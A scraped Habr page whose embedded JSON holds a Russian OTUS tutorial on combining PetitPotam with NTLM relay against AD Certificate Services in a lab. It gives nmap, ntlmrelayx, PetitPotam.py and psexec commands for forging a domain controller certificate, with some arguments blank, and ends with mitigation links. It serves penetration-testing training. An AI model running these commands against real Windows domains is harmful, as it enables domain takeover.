class="tm-separated-list tm-article-presenter__meta-list"><span class="tm-separated-list__title">Хабы:</span> <ul class="tm-separated-list__list"><li class="tm-separated-list__item"><a href="/ru/company/otus/blog/" class="tm-hubs-list__link router-link-active">
+    Блог компании OTUS
+  </a></li><li class="tm-separated-list__item"><a href="/ru/hub/infosecurity/" class="tm-hubs-list__link">
+    Информационная безопасность
+  </a></li></ul></div></div></article></div> <!----></div> <div class="tm-article-sticky-panel"><div class="tm-data-icons tm-article-sticky-panel__icons"><div class="tm-article-rating tm-data-icons__item"><div class="tm-votes-meter tm-article-rating__votes-switcher"><svg height="16" width="16" class="tm-svg-img tm-votes-meter__icon tm-votes-meter__icon_medium"><title>Всего голосов 6: ↑5 и ↓1</title> <use xlink:href="/img/megazord-v24.ce74655c.svg#counter-rating"></use></svg> <span title="Всего голосов 6: ↑5 и ↓1" class="tm-votes-meter__value tm-votes-meter__value_positive tm-votes-meter__value_medium">+4</span></div> <DIV class="v-portal" style="display:none;"></DIV></div> <!----> <span title="Количество просмотров" class="tm-icon-counter tm-data-icons__item"><svg height="16" width="16" class="tm-svg-img tm-icon-counter__icon"><title>Просмотры</title> <use xlink:href="/img/megazord-v24.ce74655c.svg#counter-views"></use></svg> <span class="tm-icon-counter__value">678</span></span> <button title="Добавить в закладки" type="button" class="bookmarks-button tm-data-icons__item"><span title="Добавить в закладки" class="tm-svg-icon__wrapper bookmarks-button__icon"><svg height="16" width="16" class="tm-svg-img tm-svg-icon"><title>Добавить в закладки</title> <use xlink:href="/img/megazord-v24.ce74655c.svg#counter-favorite"></use></svg></span> <span title="Количество пользователей, добавивших публикацию в закладки" class="bookmarks-button__counter">
+    4
+  </span></button> <!----> <div title="Поделиться" class="tm-sharing tm-data-icons__item"><button type="button" class="tm-sharing__button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="tm-sharing__icon"><path fill="currentColor" d="M10.33.275l9.047 7.572a.2.2 0 010 .306l-9.048 7.572a.2.2 0 01-.328-.153V11c-8 0-9.94 6-9.94 6S-1 5 10 5V.428a.2.2 0 01.328-.153z"></path></svg></button> <!----></div> <DIV class="v-portal" style="display:none;"></DIV></div> </div></div> <!----> <!----> <div class="tm-article-presenter__footer"><div class="tm-article-blocks"><!----> <section class="tm-block tm-block_spacing-bottom"><!----> <div class="tm-block__body tm-block__body_variant-balanced"><div class="tm-article-author"><div class="tm-article-author__company"><div class="tm-article-author__company-card"><div class="tm-company-snippet"><a href="/ru/company/otus/profile/" class="tm-company-snippet__logo-link"><div class="tm-entity-image"><img alt="" height="40" src="//habrastorage.org/getpro/habr/company/968/422/761/968422761136a38a89fc391fd927f903.jpg" width="40" class="tm-entity-image__pic"></div></a> <div class="tm-company-snippet__info"><a href="/ru/company/otus/profile/" class="tm-company-snippet__title">OTUS</a> <div class="tm-company-snippet__description">Цифровые навыки от ведущих экспертов</div></div></div> <div class="tm-article-author__buttons"><!----> <!----></div></div> <div class="tm-article-author__company-contacts"><a href="https://otus.ru" rel="noopener" target="_blank" class="tm-article-author__contact">
+      Сайт
+    </a><a href="https://facebook.com/otus.ru" rel="noopener" target="_blank" class="tm-article-author__contact">
+      Facebook
+    </a><a href="https://vk.com/club145052891" rel="noopener" target="_blank" class="tm-article-author__contact">
+      ВКонтакте
+    </a><a href="https://telegram.me/Otusjava" rel="noopener" target="_blank" class="tm-article-author__contact">
+      Telegram
+    </a></div> <div class="tm-article-author__separator"></div></div> <div class="tm-user-card tm-article-author__user-card tm-user-card_variant-article"><div class="tm-user-card__info-container"><div class="tm-user-card__header"><div class="tm-user-card__header-data"><a href="/ru/users/kmoseenk/" class="tm-user-card__userpic tm-user-card__userpic_size-40"><div class="tm-entity-image"><img alt="" src="//habrastorage.org/getpro/habr/avatars/9c1/f26/fc3/9c1f26fc3a6df952b80365d8dd4a1642.png" class="tm-entity-image__pic"></div></a> <div class="tm-user-card__meta"><div title=" 72 голоса " class="tm-karma tm-user-card__karma"><div class="tm-karma__votes tm-karma__votes_positive">
+    14
+  </div> <div class="tm-karma__text">
+    Карма
+  </div></div> <div title="Рейтинг пользователя" class="tm-rating tm-user-card__rating"><div class="tm-rating__header"> <div class="tm-rating__counter">43.8</div></div> <div class="tm-rating__text">
+    Рейтинг
+  </div></div></div></div></div> <div class="tm-user-card__info tm-user-card__info_variant-article"><div class="tm-user-card__title tm-user-card__title_variant-article"><span class="tm-user-card__name tm-user-card__name_variant-article">Ксения Мосеенкова</span> <a href="/ru/users/kmoseenk/" class="tm-user-card__nickname tm-user-card__nickname_variant-article">
+          @kmoseenk
+        </a> <!----></div> <p class="tm-user-card__short-info tm-user-card__short-info_variant-article">Контент-менеджер</p></div></div> <div class="tm-user-card__buttons tm-user-card__buttons_variant-article"><!----> <!----> <!----> <!----> <!----></div></div> <!----></div> <DIV class="v-portal" style="display:none;"></DIV></div> <!----></section> <div class="tm-article-blocks__comments"><div class="tm-article-page-comments"><div class="tm-article-comments-counter-link tm-article-comments-counter-button"><a href="/ru/company/otus/blog/583496/comments/" class="tm-article-comments-counter-link__link tm-article-comments-counter-link__link_button-style"><svg height="16" width="16" class="tm-svg-img tm-article-comments-counter-link__icon tm-article-comments-counter-link__icon_contrasted"><title>Комментарии</title> <use xlink:href="/img/megazord-v24.ce74655c.svg#counter-comments"></use></svg> <span class="tm-article-comments-counter-link__value tm-article-comments-counter-link__value_contrasted">
+       Комментарии 2 
+    </span></a> <!----></div></div></div>  <!---->  <!----> <!----></div></div></div></div></div> <div class="tm-page__sidebar"><div class="tm-layout-sidebar"><div class="tm-layout-sidebar__placeholder_initial"></div> <div class="tm-sexy-sidebar tm-sexy-sidebar_initial" style="margin-top:0px;"><!----> <section class="tm-block tm-block_spacing-bottom"><header class="tm-block__header"><h2 class="tm-block__title">Информация</h2> <!----></header> <div class="tm-block__body"><div class="tm-company-basic-info"><dl class="tm-description-list tm-description-list_variant-columns-nowrap"><dt class="tm-description-list__title tm-description-list__title_variant-columns-nowrap">Дата основания</dt> <dd class="tm-description-list__body tm-description-list__body_variant-columns-nowrap"><time datetime="2017-03-31T21:00:00.000Z" title="2017-04-01, 00:00">1  апреля  2017</time></dd></dl> <dl class="tm-description-list tm-description-list_variant-columns-nowrap"><dt class="tm-description-list__title tm-description-list__title_variant-columns-nowrap">Местоположение</dt> <dd class="tm-description-list__body tm-description-list__body_variant-columns-nowrap">
+    Россия
+  </dd></dl> <dl class="tm-description-list tm-description-list_variant-columns-nowrap"><dt class="tm-description-list__title tm-description-list__title_variant-columns-nowrap">Сайт</dt> <dd class="tm-description-list__body tm-description-list__body_variant-columns-nowrap"><a href="https://otus.ru" target="_blank" class="tm-company-basic-info__link">
+      otus.ru
+    </a></dd></dl> <dl class="tm-description-list tm-description-list_variant-columns-nowrap"><dt class="tm-description-list__title tm-description-list__title_variant-columns-nowrap">Численность</dt> <dd class="tm-description-list__body tm-description-list__body_variant-columns-nowrap">
+    51–100 человек
+  </dd></dl> <dl class="tm-description-list tm-description-list_variant-columns-nowrap"><dt class="tm-description-list__title tm-description-list__title_variant-columns-nowrap">Дата регистрации</dt> <dd class="tm-description-list__body tm-description-list__body_variant-columns-nowrap"><time datetime="2017-03-22T08:17:26.000Z" title="2017-03-22, 11:17">22  марта  2017</time></dd></dl> <dl class="tm-description-list tm-description-list_variant-columns-nowrap"><dt class="tm-description-list__title tm-description-list__title_variant-columns-nowrap">Представитель</dt> <dd class="tm-description-list__body tm-description-list__body_variant-columns-nowrap"><a href="/ru/users/MaxRokatansky/" class="tm-company-basic-info__link">
+      OTUS
+    </a></dd></dl></div></div> <!----></section> <div class="tm-company-widgets"></div> <!----></div></div></div></div></div></div></main> <!----></div> <div class="tm-footer-menu"><div class="tm-page-width"><div class="tm-footer-menu__container"><div class="tm-footer-menu__block"><h3 class="tm-footer-menu__block-title">
+          Ваш аккаунт
+        </h3> <div class="tm-footer-menu__block-content"><ul class="tm-footer-menu__list"><li class="tm-footer-menu__list-item"><a href="/kek/v1/auth/habrahabr/?back=/ru/company/otus/blog/583496/&amp;hl=ru" rel="nofollow" target="_self">
+                Войти
+              </a></li><li class="tm-footer-menu__list-item"><a href="/kek/v1/auth/habrahabr-register/?back=/ru/company/otus/blog/583496/&amp;hl=ru" rel="nofollow" target="_self">
+                Регистрация
+              </a></li></ul></div></div><div class="tm-footer-menu__block"><h3 class="tm-footer-menu__block-title">
+          Разделы
+        </h3> <div class="tm-footer-menu__block-content"><ul class="tm-footer-menu__list"><li class="tm-footer-menu__list-item"><a href="/ru/" class="footer-menu__item-link router-link-active">
+                Публикации
+              </a></li><li class="tm-footer-menu__list-item"><a href="/ru/news/" class="footer-menu__item-link">
+                Новости
+              </a></li><li class="tm-footer-menu__list-item"><a href="/ru/hubs/" class="footer-menu__item-link">
+                Хабы
+              </a></li><li class="tm-footer-menu__list-item"><a href="/ru/companies/" class="footer-menu__item-link">
+                Компании
+              </a></li><li class="tm-footer-menu__list-item"><a href="/ru/users/" class="footer-menu__item-link">
+                Авторы
+              </a></li><li class="tm-footer-menu__list-item"><a href="/ru/sandbox/" class="footer-menu__item-link">
+                Песочница
+              </a></li></ul></div></div><div class="tm-footer-menu__block"><h3 class="tm-footer-menu__block-title">
+          Информация
+        </h3> <div class="tm-footer-menu__block-content"><ul class="tm-footer-menu__list"><li class="tm-footer-menu__list-item"><a href="/ru/docs/help/" class="footer-menu__item-link">
+                Устройство сайта
+              </a></li><li class="tm-footer-menu__list-item"><a href="/ru/docs/authors/codex/" class="footer-menu__item-link">
+                Для авторов
+              </a></li><li class="tm-footer-menu__list-item"><a href="/ru/docs/companies/corpblogs/" class="footer-menu__item-link">
+                Для компаний
+              </a></li><li class="tm-footer-menu__list-item"><a href="/ru/docs/docs/transparency/" class="footer-menu__item-link">
+                Документы
+              </a></li><li class="tm-footer-menu__list-item"><a href="https://account.habr.com/info/agreement" target="_blank">
+                Соглашение
+              </a></li><li class="tm-footer-menu__list-item"><a href="https://account.habr.com/info/confidential/" target="_blank">
+                Конфиденциальность
+              </a></li></ul></div></div><div class="tm-footer-menu__block"><h3 class="tm-footer-menu__block-title">
+          Услуги
+        </h3> <div class="tm-footer-menu__block-content"><ul class="tm-footer-menu__list"><li class="tm-footer-menu__list-item"><a href="https://docs.google.com/presentation/d/e/2PACX-1vQLwRfQmXibiUlWaRg-BAc38s7oM3lJiaPju7qmdJsp8ysIvZ_G-Npem0njJLMozE2bPHMpDqiI5hhy/pub?start=false&amp;loop=false&amp;delayms=60000&amp;slide=id.g91a03369cd_4_297" target="_blank">
+                Реклама
+              </a></li><li class="tm-footer-menu__list-item"><a href="https://habrastorage.org/storage/stuff/habr/service_price.pdf" target="_blank">
+                Тарифы
+              </a></li><li class="tm-footer-menu__list-item"><a href="https://docs.google.com/presentation/d/e/2PACX-1vQJJds8-Di7BQSP_guHxICN7woVYoN5NP_22ra-BIo4bqnTT9FR6fB-Ku2P0AoRpX0Ds-LRkDeAoD8F/pub?start=false&amp;loop=false&amp;delayms=60000" target="_blank">
+                Контент
+              </a></li><li class="tm-footer-menu__list-item"><a href="https://tmtm.timepad.ru/" target="_blank">
+                Семинары
+              </a></li><li class="tm-footer-menu__list-item"><a href="/ru/megaprojects/" class="footer-menu__item-link">
+                Мегапроекты
+              </a></li></ul></div></div></div></div></div> <div class="tm-footer"><div class="tm-page-width"><div class="tm-footer__container"><!----> <div class="tm-footer__social"><a href="https://www.facebook.com/habrahabr.ru" rel="nofollow noopener noreferrer" target="_blank" class="tm-svg-icon__wrapper tm-social-icons__icon"><svg height="16" width="16" class="tm-svg-img tm-svg-icon"><title>Facebook</title> <use xlink:href="/img/social-icons-sprite.svg#social-logo-facebook"></use></svg></a><a href="https://twitter.com/habr_com" rel="nofollow noopener noreferrer" target="_blank" class="tm-svg-icon__wrapper tm-social-icons__icon"><svg height="16" width="16" class="tm-svg-img tm-svg-icon"><title>Twitter</title> <use xlink:href="/img/social-icons-sprite.svg#social-logo-twitter"></use></svg></a><a href="https://vk.com/habr" rel="nofollow noopener noreferrer" target="_blank" class="tm-svg-icon__wrapper tm-social-icons__icon"><svg height="16" width="16" class="tm-svg-img tm-svg-icon"><title>VK</title> <use xlink:href="/img/social-icons-sprite.svg#social-logo-vkontakte"></use></svg></a><a href="https://telegram.me/habr_com" rel="nofollow noopener noreferrer" target="_blank" class="tm-svg-icon__wrapper tm-social-icons__icon"><svg height="16" width="16" class="tm-svg-img tm-svg-icon"><title>Telegram</title> <use xlink:href="/img/social-icons-sprite.svg#social-logo-telegram"></use></svg></a><a href="https://www.youtube.com/channel/UCd_sTwKqVrweTt4oAKY5y4w" rel="nofollow noopener noreferrer" target="_blank" class="tm-svg-icon__wrapper tm-social-icons__icon"><svg height="16" width="16" class="tm-svg-img tm-svg-icon"><title>Youtube</title> <use xlink:href="/img/social-icons-sprite.svg#social-logo-youtube"></use></svg></a><a href="https://zen.yandex.ru/habr" rel="nofollow noopener noreferrer" target="_blank" class="tm-svg-icon__wrapper tm-social-icons__icon"><svg height="16" width="16" class="tm-svg-img tm-svg-icon"><title>Яндекс Дзен</title> <use xlink:href="/img/social-icons-sprite.svg#social-logo-zen"></use></svg></a></div> <DIV class="v-portal" style="display:none;"></DIV> <button class="tm-footer__link"><!---->
+        Настройка языка
+      </button> <a href="/ru/about" class="tm-footer__link">
+        О сайте
+      </a> <a href="/ru/feedback/" class="tm-footer__link">
+        Техническая поддержка
+      </a> <!----> <a href="/berserk-mode-nope" class="tm-footer__link">
+        Вернуться на старую версию
+      </a> <div class="tm-footer-copyright"><span class="tm-copyright"><span class="tm-copyright__years">© 2006–2021 </span> <span class="tm-copyright__name">«<a href="https://company.habr.com/" rel="noopener" target="_blank" class="tm-copyright__link">Habr</a>»</span></span></div></div></div></div> <!----> <!----></div> <div class="vue-portal-target"></div></div>
+<script>window.__INITIAL_STATE__={"adblock":{"hasAcceptableAdsFilter":false,"hasAdblock":false},"articlesList":{"articlesList":{"583496":{"id":"583496","timePublished":"2021-10-14T14:55:37+00:00","isCorporative":true,"lang":"ru","titleHtml":"Практика использования Relay+PetitPotam","leadData":{"textHtml":"\u003Cp\u003EСтатья расскажет о вариации нового метода атаки на инфраструктуру. Рассмотрим основные инструменты, подготовим тестовый стенд и проведем тест. Небольшой disclamer: статья не претендует на полноту, но является примером того как можно собрать полезную информацию и проверить работоспособность инструментов перед их использованием.\u003C\u002Fp\u003E","imageUrl":"https:\u002F\u002Fhabrastorage.org\u002Fgetpro\u002Fhabr\u002Fupload_files\u002F3fc\u002F994\u002Fd0c\u002F3fc994d0cbdab6a42f905fba1fc09396.png","buttonTextHtml":"Читать далее","image":{"url":"https:\u002F\u002Fhabrastorage.org\u002Fgetpro\u002Fhabr\u002Fupload_files\u002F3fc\u002F994\u002Fd0c\u002F3fc994d0cbdab6a42f905fba1fc09396.png","fit":"cover","positionY":0,"positionX":0}},"editorVersion":"2.0","postType":"article","postLabels":[],"author":{"scoreStats":{"score":14,"votesCount":72},"rating":43.8,"relatedData":null,"contacts":[],"authorContacts":[],"paymentDetails":{"paymentYandexMoney":null,"paymentPayPalMe":null,"paymentWebmoney":null},"id":"2723985","alias":"kmoseenk","fullname":"Ксения Мосеенкова","avatarUrl":"\u002F\u002Fhabrastorage.org\u002Fgetpro\u002Fhabr\u002Favatars\u002F9c1\u002Ff26\u002Ffc3\u002F9c1f26fc3a6df952b80365d8dd4a1642.png","speciality":"Контент-менеджер"},"statistics":{"commentsCount":2,"favoritesCount":4,"readingCount":678,"score":4,"votesCount":6},"hubs":[{"relatedData":null,"id":"21052","alias":"otus","type":"corporative","title":"Блог компании OTUS","titleHtml":"Блог компании OTUS","isProfiled":false},{"relatedData":null,"id":"50","alias":"infosecurity","type":"collective","title":"Информационная безопасность","titleHtml":"Информационная безопасность","isProfiled":true}],"flows":[{"id":"1","alias":"develop","title":"Разработка"}],"relatedData":null,"textHtml":"\u003Cdiv xmlns=\"http:\u002F\u002Fwww.w3.org\u002F1999\u002Fxhtml\"\u003E\u003Cfigure class=\"full-width \"\u003E\u003Cimg src=\"\u002Fimg\u002Fimage-loader.svg\" height=\"439\" data-src=\"https:\u002F\u002Fhabrastorage.org\u002Fgetpro\u002Fhabr\u002Fupload_files\u002F6d3\u002F544\u002Faeb\u002F6d3544aebb54f70f40be8065de5b8384.png\" data-width=\"780\"\u002F\u003E\u003Cfigcaption\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EСтатья расскажет о вариации нового метода атаки на инфраструктуру. Рассмотрим основные инструменты, подготовим тестовый стенд и проведем тест. Небольшой \u003Cem\u003EDisclamer\u003C\u002Fem\u003E: статья не претендует на полноту, но является примером того, как можно собрать полезную информацию и проверить работоспособность инструментов перед их использованием.\u003C\u002Fp\u003E\u003Ch4\u003EЧто это и как используется\u003C\u002Fh4\u003E\u003Cp\u003EКлассический пример атак типа MiTM. То есть это атаки, которые сегодня возможны, по большей части только в локальных сетях. Данный вариант атак заключается в том, что атакующий может перехватить полностью или частично данные между двумя хостами в сети и переотправить их одному из участников соединения, как правило серверу. Переотправка может включать дополнительные изменения данных, но как правило, это воздействие может быть невозможно, в силу используемых механизмов защит, либо из-за особенностей работы системы, на которую производится атака.\u003C\u002Fp\u003E\u003Cp\u003E\u003Cstrong\u003EЧто такое PetitPotam?\u003C\u002Fstrong\u003E Самое сложное для проведения атаки типа Relay — это перехват данных, которые используются для настройки соединения. Зачастую, чтобы этот момент был 100% обнаружен в момент исследования сети можно:\u003C\u002Fp\u003E\u003Col\u003E\u003Cli\u003E\u003Cp\u003EИспользовать атаки типа ARP Poison и пользователь рано или поздно обратиться к атакующему серверу\u003C\u002Fp\u003E\u003C\u002Fli\u003E\u003Cli\u003E\u003Cp\u003EИспользовать механизмы, которые принудительно заставят операционную систему начать процедуру настройки соединения.\u003C\u002Fp\u003E\u003C\u002Fli\u003E\u003C\u002Fol\u003E\u003Cp\u003EКо второму типу уловок как раз и относится \u003Ccode\u003EPetitPotam\u003C\u002Fcode\u003E. В случае конкретно этого подхода используется MS-EFSRPC протокол, который используется для вызова функции \u003Ccode\u003EEfsRpcOpenFileRaw\u003C\u002Fcode\u003E. Вызов этой функции запустит процесс аутентификации. Наибольшую популярность метод получил в совокупности с атакой \u003Ca href=\"https:\u002F\u002Fgithub.com\u002Fbats3c\u002FADCSPwn\"\u003EADCSPwn\u003C\u002Fa\u003E.\u003C\u002Fp\u003E\u003Ch4\u003EAD CS атака\u003C\u002Fh4\u003E\u003Cp\u003EНедавнее \u003Ca href=\"https:\u002F\u002Fwww.specterops.io\u002Fassets\u002Fresources\u002FCertified_Pre-Owned.pdf\"\u003Eисследование\u003C\u002Fa\u003E команды SpecterOps показало, что стандартные роли сервера для сертификатов Windows AD. Не настолько безопасны, как может показаться на первый взгляд. Согласно данным исследования, если атакующий найдет способ, как заставить контроллер домена обратиться к хосту, который поддерживает NTLM аутентификацию, то атакующий сможет заполучить сертификат для учетной записи контроллера домена. Это фактически означает, что атакующий может представляться для любых сервисов инфраструктуры контроллером домена со всеми вытекающими последствиями.\u003C\u002Fp\u003E\u003Cp\u003EНа данный момент концепцию атаки используют в совокупности с методом \u003Ccode\u003EPetitPotam\u003C\u002Fcode\u003E. Попробуем проверить насколько это возможно.\u003C\u002Fp\u003E\u003Ch4\u003EНастройка стенда для тестирования\u003C\u002Fh4\u003E\u003Cp\u003EСтенд будет состоять из 3 машин:\u003C\u002Fp\u003E\u003Cul\u003E\u003Cli\u003E\u003Cp\u003EWindows Server 2019 &lt;- котроллер домена\u003C\u002Fp\u003E\u003C\u002Fli\u003E\u003Cli\u003E\u003Cp\u003EWindows Server 2019 &lt;- сервер c ролью сертификационного центра\u003C\u002Fp\u003E\u003C\u002Fli\u003E\u003Cli\u003E\u003Cp\u003EWindows 10 &lt;- клиентская машина\u003C\u002Fp\u003E\u003C\u002Fli\u003E\u003Cli\u003E\u003Cp\u003EKali linux &lt;- машина атакующего\u003C\u002Fp\u003E\u003C\u002Fli\u003E\u003C\u002Ful\u003E\u003Cp\u003EЧтобы настроить сервер для лабораторной, можно использовать любую систему виртуализации. Затем необходимо настроить обычный домен, делается это просто через интерфейс управления сервером. Единственная особенность, которую нужно учесть при установке — добавить роль сертификационного центра. Располагается эта опция в английской локали установщика, в функции \"WebDav Redirector\". После того как установили сервера, можно начинать тестирование атаки. Для проведения теста нам понадобится следующий набор инструментов:\u003C\u002Fp\u003E\u003Cul\u003E\u003Cli\u003E\u003Cp\u003E\u003Ca href=\"https:\u002F\u002Fgithub.com\u002FSecureAuthCorp\u002Fimpacket\"\u003Eimpacket\u003C\u002Fa\u003E\u003C\u002Fp\u003E\u003C\u002Fli\u003E\u003Cli\u003E\u003Cp\u003E\u003Ca href=\"https:\u002F\u002Fgithub.com\u002Ftopotam\u002FPetitPotam\"\u003EPetitPotam.py\u003C\u002Fa\u003E\u003C\u002Fp\u003E\u003C\u002Fli\u003E\u003Cli\u003E\u003Cp\u003E\u003Ca href=\"https:\u002F\u002Fgithub.com\u002FSolomonSklash\u002FRubeusToCcache\"\u003ERubeusToCChache\u003C\u002Fa\u003E\u003C\u002Fp\u003E\u003C\u002Fli\u003E\u003C\u002Ful\u003E\u003Cp\u003EВообще к этому набору можно добавить инструменты из списка ниже:\u003C\u002Fp\u003E\u003Cul\u003E\u003Cli\u003E\u003Cp\u003E\u003Ca href=\"https:\u002F\u002Fgithub.com\u002Fgentilkiwi\u002Fmimikatz\"\u003Emimikatz\u003C\u002Fa\u003E\u003C\u002Fp\u003E\u003C\u002Fli\u003E\u003Cli\u003E\u003Cp\u003E\u003Ca href=\"https:\u002F\u002Fgithub.com\u002FGhostPack\u002FRubeus\"\u003ERubeus\u003C\u002Fa\u003E\u003C\u002Fp\u003E\u003C\u002Fli\u003E\u003C\u002Ful\u003E\u003Cp\u003EОднако, чтобы использовать эти инструменты, нужно проводить тестирование именно с Windows машины. Попробуем обойтись без них.\u003C\u002Fp\u003E\u003Ch4\u003EТестирование\u003C\u002Fh4\u003E\u003Cp\u003EСеть находится в следующем диапазоне: 192.168.47.1\u002F24 найдем  все активные машины в сети и обнаружим сертификационный сервер и контроллер домена:\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode\u003Enmap -n -sn 192.168.47.1\u002F24\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cfigure class=\"\"\u003E\u003Cimg src=\"https:\u002F\u002Fhabrastorage.org\u002Fgetpro\u002Fhabr\u002Fupload_files\u002F551\u002F4ec\u002Ff2b\u002F5514ecf2bd8b46247e40113f318f71fe.PNG\" width=\"606\" height=\"197\"\u002F\u003E\u003Cfigcaption\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cpre\u003E\u003Ccode\u003Ecurl -v http:\u002F\u002F192.168.47.144\u002Fcertsrv\u002F\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cfigure class=\"\"\u003E\u003Cimg src=\"https:\u002F\u002Fhabrastorage.org\u002Fgetpro\u002Fhabr\u002Fupload_files\u002Fbca\u002F2bf\u002Fa17\u002Fbca2bfa176a5e71d6fc0d710c195784e.PNG\" width=\"936\" height=\"345\"\u002F\u003E\u003Cfigcaption\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EЕсли сервер вернет код 301, значит один из серверов является сертификационным центром. Данный метод лишь небольшая уловка, которую можно применять на ряду с остальными методами исследования сети. Можно так же полагаться на набор сервисов, которые покажет nmap, а можно прибегнуть к поиску данных через DCOM или SMB.\u003C\u002Fp\u003E\u003Cp\u003EМожно переходить к атаке. Запустим ntlmrelayx.py\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"python\"\u003Epython3 ntlmrelayx.py -t http:\u002F\u002F192.168.47.144\u002Fcertsrv\u002Fcertfnsh.asp -smb2support --adcs --template DomainController\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cfigure class=\"\"\u003E\u003Cimg src=\"https:\u002F\u002Fhabrastorage.org\u002Fgetpro\u002Fhabr\u002Fupload_files\u002F403\u002F55c\u002F3df\u002F40355c3dfe0c2707cd01efce80c7de10.PNG\" width=\"1084\" height=\"370\"\u002F\u003E\u003Cfigcaption\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EЗаставим контроллер домена инициировать процедуру аутентификации и получим сертификат:\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"python\"\u003Epython3 PetitPotam.py 192.168.1.111 192.168.47.144\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cfigure class=\"\"\u003E\u003Cimg src=\"https:\u002F\u002Fhabrastorage.org\u002Fgetpro\u002Fhabr\u002Fupload_files\u002Fd22\u002F6b4\u002F292\u002Fd226b4292bc3b2dc4d065d146c4689bf.PNG\" width=\"851\" height=\"456\"\u002F\u003E\u003Cfigcaption\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EКак видно из вывода инструмента, мы смогли заставить контроллер домена обратиться к сертификационному центру. Теперь дело за малым, нужно перехватить данные. ntlmrelayx сделал всю необходимую работу:\u003C\u002Fp\u003E\u003Cfigure class=\"\"\u003E\u003Cimg src=\"https:\u002F\u002Fhabrastorage.org\u002Fgetpro\u002Fhabr\u002Fupload_files\u002F00c\u002Fbc0\u002Fd71\u002F00cbc0d71b5280cacbfc53a63dd8cda5.PNG\" width=\"1084\" height=\"370\"\u002F\u003E\u003Cfigcaption\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EПолученный сертификат идеально подходит сейчас под использование с инструментом Rubeus, но мы будем использовать дальше Kali Linux. Для того чтобы это было возможно, мы создадим файл \".ccache\" именно этот файл может быть использован для работы с Kerberos.\u003C\u002Fp\u003E\u003Cp\u003EПопробуем подключиться к контроллеру домена и выполнить команды:\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"bash\"\u003Eexport KRB5CCNAME=\npython3 psexec.py \u002F@ -k -no-pass\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003EТаким образом, мы успешно провели атаку на уязвимом стенде. Данный набор инструментов может быть использован для дальнейшего выполнения команд в инфраструктуре Windows AD. Для защиты от подобной атаки можно использовать \u003Ca href=\"https:\u002F\u002Fsupport.microsoft.com\u002Fen-gb\u002Ftopic\u002Fkb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429\"\u003Eрекомендации\u003C\u002Fa\u003E от вендора. И также можно поискать еще дополнительные распространенные ошибки конфигурации сертификационных серверов с помощью вот \u003Ca href=\"https:\u002F\u002Fgithub.com\u002FGhostPack\u002FPSPKIAudit\"\u003Eэтого\u003C\u002Fa\u003E инструмента.\u003C\u002Fp\u003E\u003Chr\u002F\u003E\u003Cblockquote\u003E\u003Cp\u003EСтатья подготовлена Александром Колесниковым \u003Cem\u003E(вирусный аналитик, преподаватель в OTUS)\u003C\u002Fem\u003E в рамках \u003Ca href=\"https:\u002F\u002Fotus.pw\u002FfMI1\u002F\"\u003Eкурса «Пентест. Практика тестирования на проникновение».\u003C\u002Fa\u003E\u003Cbr\u002F\u003E\u003Cbr\u002F\u003EПредлагаем посмотреть \u003Ca href=\"https:\u002F\u002Fotus.pw\u002FPzXm\u002F\"\u003E\u003Cstrong\u003Eзапись demo-урока\u003C\u002Fstrong\u003E\u003C\u002Fa\u003E курса по теме «Bloodhound. Сбор данных об Windows AD». На занятии участники вместе с преподавателем познакомились с инструментами для исследования AD, а полученные данные использовали для повышения привилегий и продвижения в сети.\u003C\u002Fp\u003E\u003C\u002Fblockquote\u003E\u003C\u002Fdiv\u003E","tags":[{"titleHtml":"пентест"},{"titleHtml":"pentest"},{"titleHtml":"тестирование на проникновение"},{"titleHtml":"petitpotam"},{"titleHtml":"Relay+PetitPotam"},{"titleHtml":"атака на инфраструктуру"},{"titleHtml":"bloodhound"},{"titleHtml":"безопасность"}],"metadata":{"stylesUrls":[],"scriptUrls":[],"shareImageUrl":"https:\u002F\u002Fhabrastorage.org\u002Fgetpro\u002Fhabr\u002Fupload_files\u002F3fc\u002F994\u002Fd0c\u002F3fc994d0cbdab6a42f905fba1fc09396.png","shareImageWidth":1200,"shareImageHeight":630,"vkShareImageUrl":"https:\u002F\u002Fhabrastorage.org\u002Fgetpro\u002Fhabr\u002Fupload_files\u002F3fc\u002F994\u002Fd0c\u002F3fc994d0cbdab6a42f905fba1fc09396.png","schemaJsonLd":"{\"@context\":\"http:\\\u002F\\\u002Fschema.org\",\"@type\":\"Article\",\"mainEntityOfPage\":{\"@type\":\"WebPage\",\"@id\":\"https:\\\u002F\\\u002Fhabr.com\\\u002Fru\\\u002Fcompany\\\u002Fotus\\\u002Fblog\\\u002F583496\\\u002F\"},\"headline\":\"Практика использования Relay+PetitPotam\",\"datePublished\":\"2021-10-14T17:55:37+03:00\",\"dateModified\":\"2021-10-14T20:38:01+03:00\",\"author\":{\"@type\":\"Person\",\"name\":\"Ксения Мосеенкова\"},\"publisher\":{\"@type\":\"Organization\",\"name\":\"Habr\",\"logo\":{\"@type\":\"ImageObject\",\"url\":\"https:\\\u002F\\\u002Fhabrastorage.org\\\u002Fwebt\\\u002Fa_\\\u002Flk\\\u002F9m\\\u002Fa_lk9mjkccjox-zccjrpfolmkmq.png\"}},\"description\":\"Статья расскажет о вариации нового метода атаки на инфраструктуру. Рассмотрим основные инструменты, подготовим тестовый стенд и проведем тест. Небольшой 